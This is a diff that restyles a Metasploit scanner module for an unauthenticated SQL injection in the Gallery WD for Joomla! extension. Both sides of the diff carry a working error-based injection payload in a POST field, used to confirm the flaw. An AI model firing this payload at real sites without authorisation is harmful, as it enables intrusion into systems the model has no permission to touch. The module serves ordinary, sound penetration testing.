@@ -11,35 +11,37 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'Gallery WD for Joomla! Unauthenticated SQL Injection Scanner',
-      'Description' => %q{
-      This module will scan for Joomla! instances vulnerable to an unauthenticated SQL injection
-      within the Gallery WD for Joomla! extension version 1.2.5 and likely prior.
-      },
-      'Author'       =>
-        [
-          'CrashBandicoot', #independent discovery/0day drop
-          'bperry' #discovery/metasploit module
+    super(
+      update_info(
+        info,
+        'Name' => 'Gallery WD for Joomla! Unauthenticated SQL Injection Scanner',
+        'Description' => %q{
+          This module will scan for Joomla! instances vulnerable to an unauthenticated SQL injection
+          within the Gallery WD for Joomla! extension version 1.2.5 and likely prior.
+        },
+        'Author' => [
+          'CrashBandicoot', # independent discovery/0day drop
+          'bperry' # discovery/metasploit module
         ],
-      'License'     => MSF_LICENSE,
-      'References'  =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'EDB', '36563']
         ],
-      'DisclosureDate' => '2015-03-30'))
+        'DisclosureDate' => '2015-03-30'
+      )
+    )
 
     register_options([
       OptString.new('TARGETURI', [true, 'Target URI of the Joomla! instance', '/'])
     ])
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     right_marker = Rex::Text.rand_text_alpha(5)
     left_marker = Rex::Text.rand_text_alpha(5)
     flag = Rex::Text.rand_text_alpha(5)
 
-    vprint_status("Checking host")
+    vprint_status('Checking host')
 
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'index.php'),
@@ -75,7 +77,7 @@ class MetasploitModule < Msf::Auxiliary
         'watermark_type' => 'none'
       },
       'vars_post' => {
-        'image_id' => "1 AND (SELECT 2425 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},0x#{flag.unpack("H*")[0]},0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)",
+        'image_id' => "1 AND (SELECT 2425 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack('H*')[0]},0x#{flag.unpack('H*')[0]},0x#{right_marker.unpack('H*')[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)",
         'rate' => '',
         'ajax_task' => 'save_hit_count',
         'task' => 'gallerybox.ajax_search'
@@ -83,22 +85,21 @@ class MetasploitModule < Msf::Auxiliary
     })
 
     unless res && res.body
-      vprint_error("Server did not respond in an expected way")
+      vprint_error('Server did not respond in an expected way')
       return
     end
 
     result = res.body =~ /#{left_marker}#{flag}#{right_marker}/
 
     if result
-      print_good("Vulnerable to unauthenticated SQL injection within Gallery WD for Joomla!")
+      print_good('Vulnerable to unauthenticated SQL injection within Gallery WD for Joomla!')
       report_vuln({
-        :host  => rhost,
-        :port  => rport,
-        :proto => 'tcp',
-        :name  => "Unauthenticated error-based SQL injection in Gallery WD for Joomla!",
-        :refs  => self.references.select { |ref| ref.ctx_val == "36563" }
+        host: rhost,
+        port: rport,
+        proto: 'tcp',
+        name: 'Unauthenticated error-based SQL injection in Gallery WD for Joomla!',
+        refs: references.select { |ref| ref.ctx_val == '36563' }
       })
     end
-
   end
 end
